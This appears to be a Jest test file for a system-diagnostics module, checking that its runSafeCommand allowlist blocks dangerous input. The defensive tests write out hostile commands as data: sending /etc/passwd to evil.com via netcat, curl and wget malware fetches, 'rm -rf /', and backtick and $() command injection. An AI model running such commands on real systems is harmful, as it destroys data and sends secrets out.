const systemDiagnostics = require('../core/systemDiagnostics');

describe('systemDiagnostics', () => {
  describe('getPlatform', () => {
    it('returns a valid platform string', () => {
      const platform = systemDiagnostics.getPlatform();
      expect(['windows', 'mac', 'linux']).toContain(platform);
    });
  });

  describe('getSystemInfo', () => {
    it('returns system information as a string', () => {
      const info = systemDiagnostics.getSystemInfo();
      expect(typeof info).toBe('string');
      expect(info.length).toBeGreaterThan(0);
    });

    it('includes OS, memory, and CPU info', () => {
      const info = systemDiagnostics.getSystemInfo();
      expect(info).toMatch(/Operating System/);
      expect(info).toMatch(/Memory/);
      expect(info).toMatch(/Processor/);
    });

    it('includes hostname and username', () => {
      const info = systemDiagnostics.getSystemInfo();
      expect(info).toMatch(/Computer Name/);
      expect(info).toMatch(/User/);
    });
  });

  describe('runSafeCommand', () => {
    it('blocks commands with semicolons (command chaining)', () => {
      const result = systemDiagnostics.runSafeCommand('hostname; rm -rf /');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks commands with pipes', () => {
      const result = systemDiagnostics.runSafeCommand('cat /etc/passwd | nc evil.com 1234');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks rm commands', () => {
      const result = systemDiagnostics.runSafeCommand('rm -rf /');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks curl commands', () => {
      const result = systemDiagnostics.runSafeCommand('curl https://evil.com');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks wget commands', () => {
      const result = systemDiagnostics.runSafeCommand('wget https://evil.com/malware');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks sudo commands', () => {
      const result = systemDiagnostics.runSafeCommand('sudo rm -rf /');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks kill commands', () => {
      const result = systemDiagnostics.runSafeCommand('kill -9 1');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks shutdown commands', () => {
      const result = systemDiagnostics.runSafeCommand('shutdown -h now');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks output redirection', () => {
      const result = systemDiagnostics.runSafeCommand('echo evil > /etc/hosts');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks npm/pip/brew (package managers)', () => {
      expect(systemDiagnostics.runSafeCommand('npm install evil')).toMatch(/BLOCKED/);
      expect(systemDiagnostics.runSafeCommand('pip install evil')).toMatch(/BLOCKED/);
      expect(systemDiagnostics.runSafeCommand('brew install evil')).toMatch(/BLOCKED/);
    });

    it('blocks backtick injection', () => {
      const result = systemDiagnostics.runSafeCommand('hostname `rm -rf /`');
      expect(result).toMatch(/BLOCKED/);
    });

    it('blocks $() command substitution', () => {
      const result = systemDiagnostics.runSafeCommand('hostname $(rm -rf /)');
      expect(result).toMatch(/BLOCKED/);
    });

    it('allows hostname on all platforms', () => {
      const result = systemDiagnostics.runSafeCommand('hostname');
      expect(result).not.toMatch(/BLOCKED/);
      expect(result.length).toBeGreaterThan(0);
    });

    it('allows whoami on all platforms', () => {
      const result = systemDiagnostics.runSafeCommand('whoami');
      expect(result).not.toMatch(/BLOCKED/);
      expect(result.length).toBeGreaterThan(0);
    });

    it('returns error for empty command', () => {
      const result = systemDiagnostics.runSafeCommand('');
      expect(result).toMatch(/Error|BLOCKED/);
    });

    it('returns error for null command', () => {
      const result = systemDiagnostics.runSafeCommand(null);
      expect(result).toMatch(/Error/);
    });

    it('blocks commands not in allowlist', () => {
      const result = systemDiagnostics.runSafeCommand('python3 -c "import os; os.system(\'rm -rf /\')"');
      expect(result).toMatch(/BLOCKED/);
    });
  });

  describe('checkNetwork', () => {
    it('returns network status as a string', () => {
      const result = systemDiagnostics.checkNetwork();
      expect(typeof result).toBe('string');
      expect(result).toMatch(/Internet Connection/);
    });

    it('includes DNS check', () => {
      const result = systemDiagnostics.checkNetwork();
      expect(result).toMatch(/DNS/);
    });
  });

  describe('listRunningApps', () => {
    it('returns process list as a string', () => {
      const result = systemDiagnostics.listRunningApps();
      expect(typeof result).toBe('string');
      expect(result.length).toBeGreaterThan(0);
    });
  });

  describe('getBatteryStatus', () => {
    it('returns battery info or "no battery" message', () => {
      const result = systemDiagnostics.getBatteryStatus();
      expect(typeof result).toBe('string');
      expect(result.length).toBeGreaterThan(0);
    });
  });

  describe('checkDiskHealth', () => {
    it('returns disk usage information', () => {
      const result = systemDiagnostics.checkDiskHealth();
      expect(typeof result).toBe('string');
      expect(result).toMatch(/Disk Usage/);
    });
  });

  describe('checkInstalledSoftware', () => {
    it('returns a list of software', () => {
      const result = systemDiagnostics.checkInstalledSoftware();
      expect(typeof result).toBe('string');
      expect(result.length).toBeGreaterThan(0);
    });

    it('can filter by search term', () => {
      // Search for something that likely doesn't exist
      const result = systemDiagnostics.checkInstalledSoftware('xyznonexistentapp12345');
      expect(typeof result).toBe('string');
    });
  });

  describe('readErrorLog', () => {
    it('returns log output or empty message', () => {
      const result = systemDiagnostics.readErrorLog('system');
      expect(typeof result).toBe('string');
    });
  });
});
